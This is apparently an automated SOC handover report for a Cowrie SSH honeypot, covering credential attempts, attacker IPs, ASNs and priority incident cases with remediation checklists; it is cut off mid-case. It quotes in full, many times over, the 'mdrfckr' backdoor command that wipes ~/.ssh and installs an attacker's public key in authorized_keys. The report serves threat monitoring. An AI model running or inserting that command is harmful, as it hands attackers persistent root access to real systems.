# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-25 |
| **Generated At** | 2026-04-25T14:47:44Z |
| **Shift Time** | 14:47 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **78** |
| Confirmed Threats | **75** |
| False Positives Filtered | **3** (3.9%) |
| Unique Attacker IPs | **8** |
| Countries of Origin | **5** |
| High Severity Cases | **28** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **50** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **72** |
| Unique Credential Pairs | **46** |
| Unique Usernames | **28** |
| Unique Passwords | **46** |
| Successful Auth Pairs | **16** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 28 |
| `345gs5662d34` | 14 |
| `ubuntu` | 3 |
| `odoo` | 2 |
| `steam` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 14 |
| `3245gs5662d34` | 14 |
| `cardemis1` | 1 |
| `chromeuser` | 1 |
| `odoo05` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 14 |
| `root` | `3245gs5662d34` | 14 |
| `user` | `cardemis1` | 1 |
| `chromeuser` | `chromeuser` | 1 |
| `odoo` | `odoo05` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `As147258` | `69.138.228.221` | 2026-04-25T13:40:40 |
| `root` | `3245gs5662d34` | `69.138.228.221` | 2026-04-25T13:40:47 |
| `root` | `Admin@2025` | `69.138.228.221` | 2026-04-25T13:42:25 |
| `root` | `2glehe5t24th1issZs` | `69.138.228.221` | 2026-04-25T13:43:19 |
| `root` | `m123456` | `69.138.228.221` | 2026-04-25T13:52:25 |
| `root` | `qq123456789` | `69.138.228.221` | 2026-04-25T13:53:19 |
| `root` | `Debian2025` | `69.138.228.221` | 2026-04-25T13:55:10 |
| `root` | `Qwe1234567` | `177.102.83.35` | 2026-04-25T13:55:21 |
| `root` | `3245gs5662d34` | `177.102.83.35` | 2026-04-25T13:55:29 |
| `root` | `Aa112211.` | `177.102.83.35` | 2026-04-25T13:56:33 |
| `root` | `MoeClub.org` | `69.138.228.221` | 2026-04-25T13:58:53 |
| `root` | `root05` | `177.102.83.35` | 2026-04-25T14:02:44 |
| `root` | `11235813` | `177.102.83.35` | 2026-04-25T14:07:15 |
| `root` | `CCdd1234` | `177.102.83.35` | 2026-04-25T14:08:28 |
| `root` | `qwert123456` | `177.102.83.35` | 2026-04-25T14:09:42 |
| `root` | `BBqq123` | `177.102.83.35` | 2026-04-25T14:14:20 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **78** |
| Sessions with Fingerprint | **2** |
| Unique HASSH Fingerprints | **2** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 72 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 72 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 72 | 2 | libssh-based |
| `95420f9d932d...` | Unknown | 1 | 1 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 14 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `69.138.228.221`, `177.102.83.35`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **8** |
| Unique ASNs | **6** |
| High-Risk ASNs | **3** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS213412` | ONYPHE SAS | 3 | HIGH |
| `AS8075` | Microsoft Corporation | 1 | MEDIUM |
| `AS7922` | Comcast Cable Communications, LLC | 1 | HIGH |
| `AS37963` | Hangzhou Alibaba Advertising Co.,Ltd. | 1 | MEDIUM |
| `AS17552` | True Online | 1 | LOW |
| `AS27699` | TELEFÔNICA BRASIL S.A | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (28)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-16a2c6644813

| Field | Detail |
|---|---|
| **Source IP** | `69.138.228[.]221` |
| **First Seen** | 2026-04-25 13:40 |
| **Last Seen** | 2026-04-25 13:40 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 13:40:39` | `cowrie.session.connect` |
| `2026-04-25 13:40:39` | `cowrie.client.version` |
| `2026-04-25 13:40:39` | `cowrie.client.kex` |
| `2026-04-25 13:40:40` | `cowrie.login.success` |
| `2026-04-25 13:40:41` | `cowrie.session.params` |
| `2026-04-25 13:40:41` | `cowrie.command.input` |
| `2026-04-25 13:40:41` | `cowrie.command.failed` |
| `2026-04-25 13:40:41` | `cowrie.log.closed` |
| `2026-04-25 13:40:42` | `cowrie.session.params` |
| `2026-04-25 13:40:42` | `cowrie.command.input` |
| `2026-04-25 13:40:42` | `cowrie.session.file_download` |
| `2026-04-25 13:40:42` | `cowrie.log.closed` |
| `2026-04-25 13:40:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.138.228[.]221` to AbuseIPDB if not already reported
- [ ] Block `69.138.228[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-552e1fc1f00f

| Field | Detail |
|---|---|
| **Source IP** | `69.138.228[.]221` |
| **First Seen** | 2026-04-25 13:40 |
| **Last Seen** | 2026-04-25 13:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 13:40:45` | `cowrie.session.connect` |
| `2026-04-25 13:40:45` | `cowrie.client.version` |
| `2026-04-25 13:40:46` | `cowrie.client.kex` |
| `2026-04-25 13:40:47` | `cowrie.login.success` |
| `2026-04-25 13:40:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.138.228[.]221` to AbuseIPDB if not already reported
- [ ] Block `69.138.228[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a09e288cbe8

| Field | Detail |
|---|---|
| **Source IP** | `69.138.228[.]221` |
| **First Seen** | 2026-04-25 13:42 |
| **Last Seen** | 2026-04-25 13:42 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 13:42:24` | `cowrie.session.connect` |
| `2026-04-25 13:42:24` | `cowrie.client.version` |
| `2026-04-25 13:42:24` | `cowrie.client.kex` |
| `2026-04-25 13:42:25` | `cowrie.login.success` |
| `2026-04-25 13:42:26` | `cowrie.session.params` |
| `2026-04-25 13:42:26` | `cowrie.command.input` |
| `2026-04-25 13:42:26` | `cowrie.command.failed` |
| `2026-04-25 13:42:26` | `cowrie.log.closed` |
| `2026-04-25 13:42:27` | `cowrie.session.params` |
| `2026-04-25 13:42:27` | `cowrie.command.input` |
| `2026-04-25 13:42:27` | `cowrie.session.file_download` |
| `2026-04-25 13:42:27` | `cowrie.log.closed` |
| `2026-04-25 13:42:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.138.228[.]221` to AbuseIPDB if not already reported
- [ ] Block `69.138.228[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e9f2e1741f4

| Field | Detail |
|---|---|
| **Source IP** | `69.138.228[.]221` |
| **First Seen** | 2026-04-25 13:42 |
| **Last Seen** | 2026-04-25 13:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 13:42:30` | `cowrie.session.connect` |
| `2026-04-25 13:42:31` | `cowrie.client.version` |
| `2026-04-25 13:42:31` | `cowrie.client.kex` |
| `2026-04-25 13:42:32` | `cowrie.login.success` |
| `2026-04-25 13:42:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.138.228[.]221` to AbuseIPDB if not already reported
- [ ] Block `69.138.228[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ac979c6ff54

| Field | Detail |
|---|---|
| **Source IP** | `69.138.228[.]221` |
| **First Seen** | 2026-04-25 13:43 |
| **Last Seen** | 2026-04-25 13:43 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 13:43:18` | `cowrie.session.connect` |
| `2026-04-25 13:43:18` | `cowrie.client.version` |
| `2026-04-25 13:43:18` | `cowrie.client.kex` |
| `2026-04-25 13:43:19` | `cowrie.login.success` |
| `2026-04-25 13:43:20` | `cowrie.session.params` |
| `2026-04-25 13:43:20` | `cowrie.command.input` |
| `2026-04-25 13:43:20` | `cowrie.command.failed` |
| `2026-04-25 13:43:20` | `cowrie.log.closed` |
| `2026-04-25 13:43:21` | `cowrie.session.params` |
| `2026-04-25 13:43:21` | `cowrie.command.input` |
| `2026-04-25 13:43:21` | `cowrie.session.file_download` |
| `2026-04-25 13:43:21` | `cowrie.log.closed` |
| `2026-04-25 13:43:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.138.228[.]221` to AbuseIPDB if not already reported
- [ ] Block `69.138.228[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8792a7edb59e

| Field | Detail |
|---|---|
| **Source IP** | `69.138.228[.]221` |
| **First Seen** | 2026-04-25 13:43 |
| **Last Seen** | 2026-04-25 13:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 13:43:24` | `cowrie.session.connect` |
| `2026-04-25 13:43:24` | `cowrie.client.version` |
| `2026-04-25 13:43:25` | `cowrie.client.kex` |
| `2026-04-25 13:43:26` | `cowrie.login.success` |
| `2026-04-25 13:43:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.138.228[.]221` to AbuseIPDB if not already reported
- [ ] Block `69.138.228[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a712620669b2

| Field | Detail |
|---|---|
| **Source IP** | `69.138.228[.]221` |
| **First Seen** | 2026-04-25 13:52 |
| **Last Seen** | 2026-04-25 13:52 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 13:52:23` | `cowrie.session.connect` |
| `2026-04-25 13:52:23` | `cowrie.client.version` |
| `2026-04-25 13:52:23` | `cowrie.client.kex` |
| `2026-04-25 13:52:25` | `cowrie.login.success` |
| `2026-04-25 13:52:25` | `cowrie.session.params` |
| `2026-04-25 13:52:25` | `cowrie.command.input` |
| `2026-04-25 13:52:25` | `cowrie.command.failed` |
| `2026-04-25 13:52:26` | `cowrie.log.closed` |
| `2026-04-25 13:52:26` | `cowrie.session.params` |
| `2026-04-25 13:52:26` | `cowrie.command.input` |
| `2026-04-25 13:52:27` | `cowrie.session.file_download` |
| `2026-04-25 13:52:27` | `cowrie.log.closed` |
| `2026-04-25 13:52:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.138.228[.]221` to AbuseIPDB if not already reported
- [ ] Block `69.138.228[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53cfc0775af9

| Field | Detail |
|---|---|
| **Source IP** | `69.138.228[.]221` |
| **First Seen** | 2026-04-25 13:52 |
| **Last Seen** | 2026-04-25 13:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 13:52:30` | `cowrie.session.connect` |
| `2026-04-25 13:52:30` | `cowrie.client.version` |
| `2026-04-25 13:52:30` | `cowrie.client.kex` |
| `2026-04-25 13:52:32` | `cowrie.login.success` |
| `2026-04-25 13:52:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.138.228[.]221` to AbuseIPDB if not already reported
- [ ] Block `69.138.228[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aacaa72d46dd

| Field | Detail |
|---|---|
| **Source IP** | `69.138.228[.]221` |
| **First Seen** | 2026-04-25 13:53 |
| **Last Seen** | 2026-04-25 13:53 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 13:53:17` | `cowrie.session.connect` |
| `2026-04-25 13:53:17` | `cowrie.client.version` |
| `2026-04-25 13:53:18` | `cowrie.client.kex` |
| `2026-04-25 13:53:19` | `cowrie.login.success` |
| `2026-04-25 13:53:20` | `cowrie.session.params` |
| `2026-04-25 13:53:20` | `cowrie.command.input` |
| `2026-04-25 13:53:20` | `cowrie.command.failed` |
| `2026-04-25 13:53:20` | `cowrie.log.closed` |
| `2026-04-25 13:53:21` | `cowrie.session.params` |
| `2026-04-25 13:53:21` | `cowrie.command.input` |
| `2026-04-25 13:53:21` | `cowrie.session.file_download` |
| `2026-04-25 13:53:21` | `cowrie.log.closed` |
| `2026-04-25 13:53:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.138.228[.]221` to AbuseIPDB if not already reported
- [ ] Block `69.138.228[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db8b30db2f9f

| Field | Detail |
|---|---|
| **Source IP** | `69.138.228[.]221` |
| **First Seen** | 2026-04-25 13:53 |
| **Last Seen** | 2026-04-25 13:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 13:53:24` | `cowrie.session.connect` |
| `2026-04-25 13:53:25` | `cowrie.client.version` |
| `2026-04-25 13:53:25` | `cowrie.client.kex` |
| `2026-04-25 13:53:26` | `cowrie.login.success` |
| `2026-04-25 13:53:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.138.228[.]221` to AbuseIPDB if not already reported
- [ ] Block `69.138.228[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f5b2d5d72f4

| Field | Detail |
|---|---|
| **Source IP** | `69.138.228[.]221` |
| **First Seen** | 2026-04-25 13:55 |
| **Last Seen** | 2026-04-25 13:55 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 13:55:08` | `cowrie.session.connect` |
| `2026-04-25 13:55:08` | `cowrie.client.version` |
| `2026-04-25 13:55:09` | `cowrie.client.kex` |
| `2026-04-25 13:55:10` | `cowrie.login.success` |
| `2026-04-25 13:55:10` | `cowrie.session.params` |
| `2026-04-25 13:55:10` | `cowrie.command.input` |
| `2026-04-25 13:55:10` | `cowrie.command.failed` |
| `2026-04-25 13:55:11` | `cowrie.log.closed` |
| `2026-04-25 13:55:11` | `cowrie.session.params` |
| `2026-04-25 13:55:11` | `cowrie.command.input` |
| `2026-04-25 13:55:12` | `cowrie.session.file_download` |
| `2026-04-25 13:55:12` | `cowrie.log.closed` |
| `2026-04-25 13:55:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.138.228[.]221` to AbuseIPDB if not already reported
- [ ] Block `69.138.228[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9592c9eb4617

| Field | Detail |
|---|---|
| **Source IP** | `69.138.228[.]221` |
| **First Seen** | 2026-04-25 13:55 |
| **Last Seen** | 2026-04-25 13:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 13:55:15` | `cowrie.session.connect` |
| `2026-04-25 13:55:15` | `cowrie.client.version` |
| `2026-04-25 13:55:15` | `cowrie.client.kex` |
| `2026-04-25 13:55:17` | `cowrie.login.success` |
| `2026-04-25 13:55:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.138.228[.]221` to AbuseIPDB if not already reported
- [ ] Block `69.138.228[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35db08548f67

| Field | Detail |
|---|---|
| **Source IP** | `177.102.83[.]35` |
| **First Seen** | 2026-04-25 13:55 |
| **Last Seen** | 2026-04-25 13:55 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 13:55:20` | `cowrie.session.connect` |
| `2026-04-25 13:55:20` | `cowrie.client.version` |
| `2026-04-25 13:55:20` | `cowrie.client.kex` |
| `2026-04-25 13:55:21` | `cowrie.login.success` |
| `2026-04-25 13:55:22` | `cowrie.session.params` |
| `2026-04-25 13:55:22` | `cowrie.command.input` |
| `2026-04-25 13:55:22` | `cowrie.command.failed` |
| `2026-04-25 13:55:22` | `cowrie.log.closed` |
| `2026-04-25 13:55:23` | `cowrie.session.params` |
| `2026-04-25 13:55:23` | `cowrie.command.input` |
| `2026-04-25 13:55:23` | `cowrie.session.file_download` |
| `2026-04-25 13:55:23` | `cowrie.log.closed` |
| `2026-04-25 13:55:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.102.83[.]35` to AbuseIPDB if not already reported
- [ ] Block `177.102.83[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25ceafd1a619

| Field | Detail |
|---|---|
| **Source IP** | `177.102.83[.]35` |
